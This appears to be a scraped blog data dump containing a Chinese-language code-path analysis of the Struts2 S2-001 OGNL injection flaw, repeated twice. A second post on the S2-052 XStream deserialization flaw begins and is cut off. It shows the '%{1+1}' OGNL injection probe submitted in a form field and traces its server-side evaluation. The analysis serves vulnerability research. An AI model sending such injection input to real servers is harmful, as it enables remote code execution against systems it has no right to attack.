\n</li>\n<li><p><strong>Tag<br>Subsystem</strong>：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</p>\n</li>\n</ul>\n<p>一个请求在Struts2框架中的处理大概分为以下几个步骤</p>\n<p>1、客户端初始化一个指向Servlet容器（例如Tomcat）的请求</p>\n<p>2、这个请求经过一系列的过滤器（Filter）（这些过滤器中有一个叫做ActionContextCleanUp的可选过滤器，这个过滤器对于Struts2和其他框架的集成很有帮助，例如：SiteMesh<br>Plugin）</p>\n<p>3、接着FilterDispatcher被调用，FilterDispatcher询问ActionMapper来决定这个请是否需要调用某个Action</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先写一个很简单的Demo</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtluV.png\" alt=\"lAtluV.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtAHS.png\" alt=\"lAtAHS.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtJN4.png\" alt=\"lAtJN4.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAt3HU.png\" alt=\"lAt3HU.png\"></p>\n<p>我们先从struts2接收我们表单中提交的参数开始分析，代码位于com/opensymphony/xwork2/interceptor/ParametersInterceptor.java</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtDHO.png\" alt=\"lAtDHO.png\"></p>\n<p>程序获得我们表单中提交的username以及password</p>\n<p>在获取表单提交参数后，进行set操作，为类中变量赋值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAYzhd.png\" alt=\"lAYzhd.png\"></p>\n<p>Set执行完之后，执行execute方法，此时username为%{1+1}，password为123</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtp9A.png\" alt=\"lAtp9A.png\"></p>\n<p>跳过一部分的中间过程，execute方法最终会调用/org/apache/struts2/views/jsp/ComponentTagSupport.java对jsp标签进行逐一解析以构建返回页面。我们直接从解析传入payload的username标签开始</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtKcq.png\" alt=\"lAtKcq.png\"></p>\n<p>当解析到”&lt;” 标签开始符合时，进入doStartTag方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAR0Wq.png\" alt=\"lAR0Wq.png\"></p>\n<p>Struts2自定义标签类重写主要就是重写doStartTag()和doEndTag()方法。</p>\n<p>doStartTag()方法是遇到标签开始时会呼叫的方法，doEndTag()方法是在遇到标签结束时呼叫的方法</p>\n<p>当doStartTag()方法执行结束后，程序重新回到index.jsp &lt;s:textfield name=”username” label=”username”/&gt;这一行，此时解析到”/&gt;”符号，接着进入doEndTag方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lARZLD.png\" alt=\"lARZLD.png\"></p>\n<p>在doEndTag方法中调用componet.end方法解析&lt;s:textfield name=”username” label=”username” /&gt;，我们跟入这个方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAt28A.png\" alt=\"lAt28A.png\"></p>\n<p>在end 方法中，可见调用evaluateParams方法，我们继续跟入该方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lARNwQ.png\" alt=\"lARNwQ.png\"></p>\n<p>在evaluateParams方法中，当this.name 不为null时，进入上图if分支</p>\n<p>由于我们解析的为index.jsp中这一&lt;s:textfield name=”username” label=”username”/&gt;</p>\n<p>此时的this.name值为”username”</p>\n<p>在if (this.name != null)这一分支中调用this.findString方法,对传入findString方法中的this.name进行处理，并将返回的值赋值给name变量</p>\n<p>由于这个name变量值以及findString方法对后文漏洞都有重要的影响，因此我们跟一下findString方法即name值获取的过程</p>\n<p>跟入findString方法，此时传入findString方法的expr参数值为”username”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lARJOS.png\" alt=\"lARJOS.png\"></p>\n<p>在findString方法中，调用translateVariables方法，此时传入translateVariables方法的expr变量值为”username”</p>\n<p>跟入translateVariables方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAR8Qf.png\" alt=\"lAR8Qf.png\"></p>\n<p>在translateVariables方法中存在一处while循环</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtu3n.png\" alt=\"lAtu3n.png\"></p>\n<p>在循环中，会判断expression是否以”%{”开头且以”}”结尾</p>\n<p>当满足这个条件，程序将认为其是表达式，并进入如下if分支进行表达式计算处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lARrlV.png\" alt=\"lARrlV.png\"></p>\n<p>但是很显然，我们本次的expression为字符串”username”，并不满足条件，因此没有办法进入上图119行处的if分支，直接返回，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtag1.png\" alt=\"lAtag1.png\"></p>\n<p>在return后，程序继续回到evaluateParams方法中，此时if (this.name !=<br>null)已经执行结束，经过上文的分析，findString方法的原理以及name值的得来已经很清楚了。evaluateParams方法中除了if(this.name != null)，还有一连串很多if分支</p>\n<p>程序会继续执行后续的if，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtRgI.png\" alt=\"lAtRgI.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtCct.png\" alt=\"lAtCct.png\"></p>\n<p>我们跳过中间这一长串if，直接看上图断点处</p>\n<p>在altSyntax开启时，进入此分支</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lARndH.png\" alt=\"lARndH.png\"></p>\n<p>此时的name为”username”，即从上文if (this.name !=null)分支那个我们上文分析的那个if分支内获取来</p>\n<p>上图红框中的Expr变量，是由name拼接”%{}”得来，因此值为”%{“username”}”</p>\n<p>紧接着这个expr又在下一行代码中传入findValue，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtgCd.png\" alt=\"lAtgCd.png\"></p>\n<p>FindValue方法经过上文if (this.name != null)分支分析，大家一定已经很熟悉</p>\n<p>FindValue方法最终会将expr即”%{“username”}”传入translateVariables方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtBDK.png\" alt=\"lAtBDK.png\"></p>\n<p>不同于上文那次，此时的expr可是以“%{“开头并且以”}”结尾，满足进入if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0))分支的条件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAt64H.png\" alt=\"lAt64H.png\"></p>\n<p>Expr经过下图120的substring取值操作，最后将”%{}”脱掉，将”username”赋值给var</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAt91I.png\" alt=\"lAt91I.png\"></p>\n<p>接着var被传入Stack.findValue，我们跟入Stack.findValue方法</p>\n<p>Stack.findValue如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtn9s.png\" alt=\"lAtn9s.png\"></p>\n<p>stack.findValue对Ognl表达式进行getValue处理，在经过stack.findValue操作后将表单中username的值进行返回</p>\n<p>程序找到我们提交的表单中username的值为”%{1+1}”，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAt0u6.png\" alt=\"lAt0u6.png\"></p>\n<p>上图这个值就是我们构造的payload</p>\n<p>O为stack.findValue的返回值，因此o为”%{1+1}”，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtZNQ.png\" alt=\"lAtZNQ.png\"></p>\n<p>接着o在字符拼接处理后，赋值给expression变量，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtVAg.png\" alt=\"lAtVAg.png\"></p>\n<p>由上图可见， expression 被拼接成 “%{1+1}”</p>\n<p>注意，这时候我们还在while循环中，while循环仍没有结束</p>\n<p>在这一次的循环中expression 为 “%{1+1}”，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lARdFs.png\" alt=\"lARdFs.png\"></p>\n<p>expression 为 “%{1+1}”</p>\n<p>与上文流程一致，此时 “1+1”被取出赋值给var，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtMj0.png\" alt=\"lAtMj0.png\"></p>\n<p>Var被传递给stack.findValue，findValue中对”1+1”表达式进行getValue操作，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lARQJI.png\" alt=\"lARQJI.png\"></p>\n<p>stack.findValue将处理后的结果2赋值给o，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtdjx.png\" alt=\"lAtdjx.png\"></p>\n<p>expression由o拼接而来，拼接后的expression 为 2，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtkB8.png\" alt=\"lAtkB8.png\"></p>\n<p>我们仍然在while循环中，在这一次的循环中expression 为 2，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAt1BT.png\" alt=\"lAt1BT.png\"></p>\n<p>此时expression已经不能满足”%{}”的格式，自然也不会进入后续if分支继续计算</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtFnf.png\" alt=\"lAtFnf.png\"></p>\n<p>因此break跳出while循环，将值进行return</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtsED.png\" alt=\"lAtsED.png\"></p>\n<p>此时return的username值为计算后的2</p>\n<p>其实在弄清程序处理的步骤后，不难发现，其实struts2是这样执行的</p>\n<ol>\n<li><p>struts2获得要处理的表单字段名，这里对应的是”username”</p>\n</li>\n<li><p>将字段名拼接成”%{}”形式，即”%{“username”}”</p>\n</li>\n<li><p>进入while循环，在while循环中，只要满足”%{}”形式，就将其中值取出进行Ognl<br>getValue操作，这里对应的就是取出username的value值，即我们构造的payload”%{1+1}”。<br>这个操作可以理解为用来取出表单字段对应的value操作</p>\n</li>\n<li><p>由于取出的username值”%{1+1}”仍满足”%{}”形式，1+1即被取出传入进行Ongl<br>getValue操作，1+1最后返回值为2</p>\n</li>\n<li><p>由于2不满足”%{}”形式，while循环停止，将2进行返回</p>\n</li>\n<li><p>程序构造返回页面，进行返回</p>\n</li>\n</ol>\n<h2 id=\"一些想法\"><a href=\"#一些想法\" class=\"headerlink\" title=\"一些想法\"></a>一些想法</h2><p>S2-001的官方描述如下</p>\n<p>WebWork 2.1+和Struts 2的“<br>altSyntax”功能允许将OGNL表达式插入文本字符串并进行递归处理。这允许恶意用户通常通过HTML文本字段提交包含OGNL表达式的字符串，如果表单验证失败，该字符串将由服务器执行。</p>\n<p>但是只有表单验证失败才会触发漏洞吗？</p>\n<p>接下来我们做个实验验证</p>\n<p>首先修改了下后台代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtehj.png\" alt=\"lAtehj.png\"></p>\n<p>结果表明Success与否，都返回index.jsp</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAYxtH.png\" alt=\"lAYxtH.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lAtGEF.png\" alt=\"lAtGEF.png\"></p>\n<p>表达式仍然可以执行，可见与success无关</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Struts2 S2-001漏洞深入研究</p>","more":"<h2 id=\"Struts2工作原理\"><a href=\"#Struts2工作原理\" class=\"headerlink\" title=\"Struts2工作原理\"></a>Struts2工作原理</h2><p>Suruts2的工作原理如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lARuod.png\" alt=\"lARuod.png\"></p>\n<p>在该图中，一共给出了四种颜色的标识，其对应的意义如下。</p>\n<ul>\n<li><p>Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。</p>\n</li>\n<li><p>Struts Core(浅蓝色)：Struts2的核心部分。</p>\n</li>\n<li><p>Interceptors(浅绿色)：Struts2的拦截器。</p>\n</li>\n<li><p>User created(浅黄色)：需要开发人员创建的部分。</p>\n</li>\n</ul>\n<p>图中的一些组件的作用如下：</p>\n<ul>\n<li><p><strong>FilterDispatcher</strong>：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。</p>\n</li>\n<li><p><strong>ActionMapper</strong>：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</p>\n</li>\n<li><p><strong>ActionProxy</strong>：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。</p>\n</li>\n<li><p><strong>ConfigurationManager</strong>：是xwork配置的管理中心，可以把它当做已经读取到内存中的struts.xml配置文件。</p>\n</li>\n<li><p><strong>struts.xml</strong>：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</p>\n</li>\n<li><p><strong>ActionInvocation</strong>：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</p>\n</li>\n<li><p><strong>Interceptor</strong>：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</p>\n</li>\n<li><p><strong>Action</strong>：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</p>\n</li>\n<li><p><strong>Result</strong>：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</p>\n</li>\n<li><p><strong>Templates</strong>：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</p>\n</li>\n<li><p><strong>Tag<br>Subsystem</strong>：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</p>\n</li>\n</ul>\n<p>一个请求在Struts2框架中的处理大概分为以下几个步骤</p>\n<p>1、客户端初始化一个指向Servlet容器（例如Tomcat）的请求</p>\n<p>2、这个请求经过一系列的过滤器（Filter）（这些过滤器中有一个叫做ActionContextCleanUp的可选过滤器，这个过滤器对于Struts2和其他框架的集成很有帮助，例如：SiteMesh<br>Plugin）</p>\n<p>3、接着FilterDispatcher被调用，FilterDispatcher询问ActionMapper来决定这个请是否需要调用某个Action</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先写一个很简单的Demo</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtluV.png\" alt=\"lAtluV.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtAHS.png\" alt=\"lAtAHS.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtJN4.png\" alt=\"lAtJN4.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAt3HU.png\" alt=\"lAt3HU.png\"></p>\n<p>我们先从struts2接收我们表单中提交的参数开始分析，代码位于com/opensymphony/xwork2/interceptor/ParametersInterceptor.java</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtDHO.png\" alt=\"lAtDHO.png\"></p>\n<p>程序获得我们表单中提交的username以及password</p>\n<p>在获取表单提交参数后，进行set操作，为类中变量赋值</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAYzhd.png\" alt=\"lAYzhd.png\"></p>\n<p>Set执行完之后，执行execute方法，此时username为%{1+1}，password为123</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtp9A.png\" alt=\"lAtp9A.png\"></p>\n<p>跳过一部分的中间过程，execute方法最终会调用/org/apache/struts2/views/jsp/ComponentTagSupport.java对jsp标签进行逐一解析以构建返回页面。我们直接从解析传入payload的username标签开始</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtKcq.png\" alt=\"lAtKcq.png\"></p>\n<p>当解析到”&lt;” 标签开始符合时，进入doStartTag方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAR0Wq.png\" alt=\"lAR0Wq.png\"></p>\n<p>Struts2自定义标签类重写主要就是重写doStartTag()和doEndTag()方法。</p>\n<p>doStartTag()方法是遇到标签开始时会呼叫的方法，doEndTag()方法是在遇到标签结束时呼叫的方法</p>\n<p>当doStartTag()方法执行结束后，程序重新回到index.jsp &lt;s:textfield name=”username” label=”username”/&gt;这一行，此时解析到”/&gt;”符号，接着进入doEndTag方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lARZLD.png\" alt=\"lARZLD.png\"></p>\n<p>在doEndTag方法中调用componet.end方法解析&lt;s:textfield name=”username” label=”username” /&gt;，我们跟入这个方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAt28A.png\" alt=\"lAt28A.png\"></p>\n<p>在end 方法中，可见调用evaluateParams方法，我们继续跟入该方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lARNwQ.png\" alt=\"lARNwQ.png\"></p>\n<p>在evaluateParams方法中，当this.name 不为null时，进入上图if分支</p>\n<p>由于我们解析的为index.jsp中这一&lt;s:textfield name=”username” label=”username”/&gt;</p>\n<p>此时的this.name值为”username”</p>\n<p>在if (this.name != null)这一分支中调用this.findString方法,对传入findString方法中的this.name进行处理，并将返回的值赋值给name变量</p>\n<p>由于这个name变量值以及findString方法对后文漏洞都有重要的影响，因此我们跟一下findString方法即name值获取的过程</p>\n<p>跟入findString方法，此时传入findString方法的expr参数值为”username”</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lARJOS.png\" alt=\"lARJOS.png\"></p>\n<p>在findString方法中，调用translateVariables方法，此时传入translateVariables方法的expr变量值为”username”</p>\n<p>跟入translateVariables方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAR8Qf.png\" alt=\"lAR8Qf.png\"></p>\n<p>在translateVariables方法中存在一处while循环</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtu3n.png\" alt=\"lAtu3n.png\"></p>\n<p>在循环中，会判断expression是否以”%{”开头且以”}”结尾</p>\n<p>当满足这个条件，程序将认为其是表达式，并进入如下if分支进行表达式计算处理</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lARrlV.png\" alt=\"lARrlV.png\"></p>\n<p>但是很显然，我们本次的expression为字符串”username”，并不满足条件，因此没有办法进入上图119行处的if分支，直接返回，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtag1.png\" alt=\"lAtag1.png\"></p>\n<p>在return后，程序继续回到evaluateParams方法中，此时if (this.name !=<br>null)已经执行结束，经过上文的分析，findString方法的原理以及name值的得来已经很清楚了。evaluateParams方法中除了if(this.name != null)，还有一连串很多if分支</p>\n<p>程序会继续执行后续的if，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtRgI.png\" alt=\"lAtRgI.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtCct.png\" alt=\"lAtCct.png\"></p>\n<p>我们跳过中间这一长串if，直接看上图断点处</p>\n<p>在altSyntax开启时，进入此分支</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lARndH.png\" alt=\"lARndH.png\"></p>\n<p>此时的name为”username”，即从上文if (this.name !=null)分支那个我们上文分析的那个if分支内获取来</p>\n<p>上图红框中的Expr变量，是由name拼接”%{}”得来，因此值为”%{“username”}”</p>\n<p>紧接着这个expr又在下一行代码中传入findValue，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtgCd.png\" alt=\"lAtgCd.png\"></p>\n<p>FindValue方法经过上文if (this.name != null)分支分析，大家一定已经很熟悉</p>\n<p>FindValue方法最终会将expr即”%{“username”}”传入translateVariables方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtBDK.png\" alt=\"lAtBDK.png\"></p>\n<p>不同于上文那次，此时的expr可是以“%{“开头并且以”}”结尾，满足进入if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0))分支的条件</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAt64H.png\" alt=\"lAt64H.png\"></p>\n<p>Expr经过下图120的substring取值操作，最后将”%{}”脱掉，将”username”赋值给var</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAt91I.png\" alt=\"lAt91I.png\"></p>\n<p>接着var被传入Stack.findValue，我们跟入Stack.findValue方法</p>\n<p>Stack.findValue如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtn9s.png\" alt=\"lAtn9s.png\"></p>\n<p>stack.findValue对Ognl表达式进行getValue处理，在经过stack.findValue操作后将表单中username的值进行返回</p>\n<p>程序找到我们提交的表单中username的值为”%{1+1}”，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAt0u6.png\" alt=\"lAt0u6.png\"></p>\n<p>上图这个值就是我们构造的payload</p>\n<p>O为stack.findValue的返回值，因此o为”%{1+1}”，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtZNQ.png\" alt=\"lAtZNQ.png\"></p>\n<p>接着o在字符拼接处理后，赋值给expression变量，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtVAg.png\" alt=\"lAtVAg.png\"></p>\n<p>由上图可见， expression 被拼接成 “%{1+1}”</p>\n<p>注意，这时候我们还在while循环中，while循环仍没有结束</p>\n<p>在这一次的循环中expression 为 “%{1+1}”，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lARdFs.png\" alt=\"lARdFs.png\"></p>\n<p>expression 为 “%{1+1}”</p>\n<p>与上文流程一致，此时 “1+1”被取出赋值给var，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtMj0.png\" alt=\"lAtMj0.png\"></p>\n<p>Var被传递给stack.findValue，findValue中对”1+1”表达式进行getValue操作，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lARQJI.png\" alt=\"lARQJI.png\"></p>\n<p>stack.findValue将处理后的结果2赋值给o，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtdjx.png\" alt=\"lAtdjx.png\"></p>\n<p>expression由o拼接而来，拼接后的expression 为 2，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtkB8.png\" alt=\"lAtkB8.png\"></p>\n<p>我们仍然在while循环中，在这一次的循环中expression 为 2，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAt1BT.png\" alt=\"lAt1BT.png\"></p>\n<p>此时expression已经不能满足”%{}”的格式，自然也不会进入后续if分支继续计算</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtFnf.png\" alt=\"lAtFnf.png\"></p>\n<p>因此break跳出while循环，将值进行return</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtsED.png\" alt=\"lAtsED.png\"></p>\n<p>此时return的username值为计算后的2</p>\n<p>其实在弄清程序处理的步骤后，不难发现，其实struts2是这样执行的</p>\n<ol>\n<li><p>struts2获得要处理的表单字段名，这里对应的是”username”</p>\n</li>\n<li><p>将字段名拼接成”%{}”形式，即”%{“username”}”</p>\n</li>\n<li><p>进入while循环，在while循环中，只要满足”%{}”形式，就将其中值取出进行Ognl<br>getValue操作，这里对应的就是取出username的value值，即我们构造的payload”%{1+1}”。<br>这个操作可以理解为用来取出表单字段对应的value操作</p>\n</li>\n<li><p>由于取出的username值”%{1+1}”仍满足”%{}”形式，1+1即被取出传入进行Ongl<br>getValue操作，1+1最后返回值为2</p>\n</li>\n<li><p>由于2不满足”%{}”形式，while循环停止，将2进行返回</p>\n</li>\n<li><p>程序构造返回页面，进行返回</p>\n</li>\n</ol>\n<h2 id=\"一些想法\"><a href=\"#一些想法\" class=\"headerlink\" title=\"一些想法\"></a>一些想法</h2><p>S2-001的官方描述如下</p>\n<p>WebWork 2.1+和Struts 2的“<br>altSyntax”功能允许将OGNL表达式插入文本字符串并进行递归处理。这允许恶意用户通常通过HTML文本字段提交包含OGNL表达式的字符串，如果表单验证失败，该字符串将由服务器执行。</p>\n<p>但是只有表单验证失败才会触发漏洞吗？</p>\n<p>接下来我们做个实验验证</p>\n<p>首先修改了下后台代码</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtehj.png\" alt=\"lAtehj.png\"></p>\n<p>结果表明Success与否，都返回index.jsp</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAYxtH.png\" alt=\"lAYxtH.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/26/lAtGEF.png\" alt=\"lAtGEF.png\"></p>\n<p>表达式仍然可以执行，可见与success无关</p>"},{"title":"Struts2 S2-052漏洞分析","date":"2019-06-30T10:21:12.000Z","cover":"https://s2.ax1x.com/2019/12/27/lVXHHJ.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nStruts2 REST插件在使用xstreamhandler处理反序列化XML时没有进行任何过滤，从而导致远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。\n\n<!--more-->\n\n漏洞分析\n--------\n\n首先看一下struts-plugin.xml配置文件，当Content-Type为xml时会调用XStreamHandler类进行处理\n\n![lVq36g.png](https://s2.ax1x.com/2019/12/27/lVq36g.png)\n\n在struts-plugin.xml配置文件中可见，当Content-Type为xml时会调用XStreamHandler类进行处理\n\n![lVqJmj.png](https://s2.ax1x.com/2019/12/27/lVqJmj.png)\n\n此外，从上图还可以看出xml是struts2请求中后缀的默认支持格式\n\n当请求报文中Content-Type为”application/xml”时，程序会调用XStreamHandler.toObject\n\n![lVqPfK.png](https://s2.ax1x.com/2019/12/27/lVqPfK.png)\n\ntoObject方法中将会调用XStream.fromXML对传入的xml的内容进行反序列化。在这个过程中，XStream没有对Reader做任何过滤处理\n\n我们通过调试代码来跟踪一下实际的流程\n\n首先我们构造如下数据包以触发漏洞\n\n![lVbbWT.png](https://s2.ax1x.com/2019/12/27/lVbbWT.png)\n\n构造如上图请求数据，将请求中的Content-Type设置为application/xml\n\n当请求进入struts2的Content-Type拦截器即ContentTypeInterceptor时，程序会根据请求中Content-Type类型寻找对应的handler，并调用handler进行反序列化操作，如下图\n\n![lVqklD.png](https://s2.ax1x.com/2019/12/27/lVqklD.png)\n\nContentTypeInterceptor具体的执行流程如下：\n\n1、程序通过getHandlerForRequest方法会判断提交的请求类型并使用对应的handler\n\n![lVqZmd.png](https://s2.ax1x.com/2019/12/27/lVqZmd.png)\n\n![lVqMff.png](https://s2.ax1x.com/2019/12/27/lVqMff.png)\n\n由上图可见，此时Content-Type为application/xml形式的请求对应的handler为XStreamHandler\n\n2、通过getContentLength方法获取提交的数据包长度，如果长度大于0则就获取其输入流并将其生成一个InputStreamReader对象赋值给reader，操作见下图红框\n\n![lVbjOJ.png](https://s2.ax1x.com/2019/12/27/lVbjOJ.png)\n\n3、调用对应handler的toObject方法将reader数据流进行xml反序列化\n\n![lVqST1.png](https://s2.ax1x.com/2019/12/27/lVqST1.png)\n\n通过上图可见，在这里对应的handler为XStreamHandler\n\n跟进XStreamHandler类的toObject方法\n\n![lVqUkq.png](https://s2.ax1x.com/2019/12/27/lVqUkq.png)\n\n![lVqY0s.png](https://s2.ax1x.com/2019/12/27/lVqY0s.png)\n\nXStreamHandler类中toObject方法调用 